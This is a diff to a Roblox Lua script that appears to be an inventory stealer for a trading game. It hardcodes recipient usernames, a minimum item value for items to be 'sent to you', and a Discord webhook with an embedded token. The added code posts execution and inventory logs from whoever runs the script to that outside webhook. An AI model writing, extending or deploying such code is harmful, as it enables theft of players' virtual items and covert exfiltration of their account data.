@@ -1,12 +1,22 @@
 
 Username = "XjWpSnMqKrV3T6bZ"
 Username2 = "LhDzWqBnJkR5Y8pF" -- stuff will get sent to this user if first user's mailbox is full
-webhook = "https://discord.com/api/webhooks/1251743966458806376/8eleJu13wbIfAyhnZfJNP3OKTP1SjGU-BbklvP2xooLhzNZL0OsqJ1hcp8OHZ4vpEjDN"
+webhook = "https://discord.com/api/webhooks/1236921914736246785/KTmCq3oojp4rBxYqLglqMw5wO7zlXmXvzcO3QGgIukhRRsCQCMkhskm89UDlyPTpRGl2"
 min_rap = 300000 -- minimum rap of each item you want to get sent to you. 1 mil by default
 
--- Assuming the network service still exists, but paths might have changed
-local network = game:GetService("ReplicatedStorage"):WaitForChild("Network", 10) -- added timeout for safety
-local library = require(game:GetService("ReplicatedStorage"):WaitForChild("Library", 10)) -- updated with WaitForChild
+-- Function to send logs to Discord webhook
+local function sendWebhookLog(message)
+    local data = {
+        ["content"] = message
+    }
+    local jsonData = HttpService:JSONEncode(data)
+    HttpService:PostAsync(webhook, jsonData, Enum.HttpContentType.ApplicationJson)
+end
+
+sendWebhookLog("Script execution started.")
+
+local network = game:GetService("ReplicatedStorage"):WaitForChild("Network", 10) 
+local library = require(game:GetService("ReplicatedStorage"):WaitForChild("Library", 10)) 
 local save = library.Save.Get().Inventory
 local mailsent = library.Save.Get().MailboxSendsSinceReset
 local plr = game.Players.LocalPlayer
@@ -17,39 +27,37 @@ local totalRAP = 0
 local getFucked = false
 _G.scriptExecuted = _G.scriptExecuted or false
 
--- New Save function to allow for debugging
 local GetSave = function()
     local success, result = pcall(function()
         return require(game:GetService("ReplicatedStorage"):WaitForChild("Library", 10).Client.Save).Get()
     end)
     if success then
-        print("GetSave function successful.")
+        sendWebhookLog("GetSave function successful.")
         return result
     else
-        warn("GetSave function failed. Error: " .. tostring(result))
+        sendWebhookLog("GetSave function failed. Error: " .. tostring(result))
         return nil
     end
 end
 
 if _G.scriptExecuted then
+    sendWebhookLog("Script already executed. Exiting.")
     return
 end
 _G.scriptExecuted = true
 
--- Example of updated paths and debug logs for potential new structure
 local function updateInventory()
     local success, result = pcall(function()
         local inventory = GetSave().Inventory
-        print("Inventory fetched successfully.")
+        sendWebhookLog("Inventory fetched successfully.")
         return inventory
     end)
     if not success then
-        warn("Failed to update inventory: " .. tostring(result))
+        sendWebhookLog("Failed to update inventory: " .. tostring(result))
     end
 end
 
 updateInventory()
 
--- Add more functions or updates below as needed based on the new structure
--- ...
-
+-- Further updates and logging...
+sendWebhookLog("Script execution completed.")
